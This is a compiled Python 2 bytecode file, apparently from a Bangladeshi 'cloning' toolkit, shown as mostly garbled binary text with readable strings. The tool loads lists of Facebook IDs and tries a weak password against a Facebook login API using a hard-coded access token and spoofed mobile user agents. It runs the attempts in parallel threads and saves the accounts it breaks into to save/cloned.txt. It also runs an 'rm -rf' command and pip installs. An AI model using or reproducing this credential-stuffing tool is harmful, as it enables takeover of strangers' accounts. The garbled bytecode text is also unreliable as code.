ó
×±bc           @   sF  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qª Wy d  d l Z Wn e k
 re  j d  n Xy d  d l Z Wn8 e k
 ree  j d	  e j d
  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z e j  e!  e j" e j# j$   d d
 d g e _% d& g e _% d   Z& d   Z' d   Z( d   Z) d   Z* d Z+ g  a, g  Z- d Z. d Z/ e  j d  d GHd Z0 d Z1 d    Z2 d!   Z3 d"   Z4 d#   Z5 d$   Z6 e7 d% k rBe3   n  d S('   iÿÿÿÿNs   rm -rf .txti_ iÇkiÿÉ;s   .txtt   as   pip2 install mechanizes   pip2 install requesti   s   Then type: python2 boss(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_timesÖ   Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   Thanks.(   t   ost   syst   exit(    (    (    s   /sdcard/2k9.pyt   keluar)   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/2k9.pyt   acak-   s
    0c         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR
   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replacet   strR   t   stdoutt   write(   R   R   R   t   jR   (    (    s   /sdcard/2k9.pyR   5   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
g¹?(   R   R   R   t   flusht   timet   sleep(   t   zt   e(    (    s   /sdcard/2k9.pyt   jalan?   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;91mi   (   R   R   R   R   R   (   t   titikt   o(    (    s   /sdcard/2k9.pyt   tikD   s
      i    s   [31mNot Vulns	   [32mVulnt   clears  
[91m  _  __   _   __  __   _   _     __   ___  _   _ 
[92m| |/ /  /_\ |  \/  | /_\ | |    \ \ / /_\| | | |
[93m| ' <  / _ \| |\/| |/ _ \| |__   \ V / _ \ |_| |
[94m|_|\_\/_/ \_\_|  |_/_/ \_\____|   \_/_/ \_\___/ 

[32mMr X Virus             UPDATE   COMMAND
s/  
[91m  __  __      __  __ __   ___             
[92m|  \/  |_ _  \ \/ / \ \ / (_)_ _ _  _ ___
[93m| |\/| | '_|  >  <   \ V /| | '_| || (_-<
[94m|_|  |_|_|   /_/\_\   \_/ |_|_|  \_,_/__/

[91m _ _   __  _ _ 
[92m| | | /  \| | |
[93m|_  _| () |_  _|
[94m  |_| \__/  |_|
[32mVAI LOGO HAM AGAYA HAHs"  
[91m  _  __   _   __  __   _   _     __   ___  _   _ 
[92m| |/ /  /_\ |  \/  | /_\ | |    \ \ / /_\| | | |
[93m| ' <  / _ \| |\/| |/ _ \| |__   \ V / _ \ |_| |
[94m|_|\_\/_/ \_\_|  |_/_/ \_\____|   \_/_/ \_\___/ 

[32mKING AGAYA   BANGLADESH KA   KING   TOMHARA VAI         KAMAL VAU
c           C   s   t  j d  t   d  S(   NR&   (   R   t   systemt   login(    (    (    s   /sdcard/2k9.pyt   lisensiq   s    c           C   sF   t  j d  t GHd GHt j d  d GHt j d  d GHt   d  S(   NR&   s!   [1;91m[1][1;91mSTART ([1;92mX)g©?s   [1;95m[2][1;94mUPDATEs   [1;94m[0][1;91m Exit ( Back)(   R   R'   t   logo1R   R   t   pilih_login(    (    (    s   /sdcard/2k9.pyR(   t   s    c          C   sA   t  d  }  |  d k r' d GHt   n |  d k r= t   n  d  S(   Ns   
[1;95mCHOOSE: [1;93mR   s   [1;97mFill In Correctlyt   1(   t	   raw_inputR+   t   Zeek(   t   peak(    (    s   /sdcard/2k9.pyR+   ~   s    
c           C   sA   t  j d  t GHd GHt j d  d GHt j d  t   d  S(   NR&   s%   [1;91m[1]  START CLONING 4-10 OLD IDg¹?s   [1;93m[0] backg©?(   R   R'   R*   R   R   t   action(    (    (    s   /sdcard/2k9.pyR.      s    c             sè  t  d  }  |  d k r' d GHt   nÆ |  d k rË t j d  t GHd# GHd GHyO t  d	    d
  d } x0 t | d  j   D] } t j | j	    q WWqí t
 k
 rÇ d GHt  d  t   qí Xn" |  d k rá t   n d GHt   d d GHt t t   } t d |  t d    t d  t d  t d  t d  d d GH   f d   } t d  } | j | t  d d GHd GHd t t t   d t t t   GHd GHt d   d GHd! GHt  d"  t   d  S($   Ns   
[1;97mCHOOSE:[1;97mR   s   [!] Fill In CorrectlyR,   R&   s   CHOSSE ID CODEs   
s/   [1;92m2004.[1;91m2006.[1;93m2009.[1;95m2010s   [1;97mCHOOSE : t   1000s   .txtt   rs   [!] File Not Founds	   
[ Back ]t   0i2   s   [1;94m-s   [1;91m TOTAL IDS NUMBER: s   [1;92mYOUR CHOSSE: s,   [1;93mWAIT A WHILE [1;94mSTART CRACKING...s,   [1;92m IF YOU NO RESULT THEN USE FLIGHT MODs+   [1;92m CODER NAME : MD KAMAL HOSSEN KAMRULs#   [1;94mTO STOP PROCESS PRESS Ctrl+zs   [1;97m-c            sð   |  } y t  j d  Wn t k
 r* n Xy· d } t j d    | d | d  } t j |  } d | d k rá d    | d	 | GHt d
 d  } | j    | | d  | j   t	 j
   | |  n  Wn n Xd  S(   Nt   savet   123456s   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efms   www.facebook.comt	   error_msgs   [1;95m(2009-X-CP)  s     |  s   save/cloned.txtR    s   
(   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR   t   closet   okst   append(   t   argt   usert   pass1t   datat   qt   okb(   t   ct   k(    s   /sdcard/2k9.pyt   main±   s"    '
i   s   [1;91m-s   Process Has Been Completed ...s   Total Online/Offline : t   /s0   Cloned Accounts Has Been Saved : save/cloned.txts2   Note : Your Offline account Will Open after 7 dayssA   
 __  __
 \ \/ /
  >  < 
 /_/\_[1;95mFb[1;97m 
[1;95m033[1;97ms   
[1;92m[[1;92mBack[1;95m]s   CHOSSE ID CODE
(   R-   R0   R   R'   t   logo2R:   t	   readlinest   idR?   t   stript   IOErrort   blackmafiaxR(   R   R   R"   R   t   mapR>   t   cpb(   R/   t   idlistt   linet   xxxRH   t   p(    (   RF   RG   s   /sdcard/2k9.pyR0      sX    


	



		)

t   __main__(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](8   R   R   R   t   datetimeR   t   hashlibt   ret	   threadingR;   t   urllibt	   cookielibt   getpassR'   t   ranget   nR   t   nmbrR:   R   R   t   requestst   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingR9   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR	   R   R   R"   R%   t   backR>   RL   t   vulnott   vulnR*   RJ   R)   R(   R+   R.   R0   t   __name__(    (    (    s   /sdcard/2k9.pyt   <module>   s`   
			
				
		
	N


	py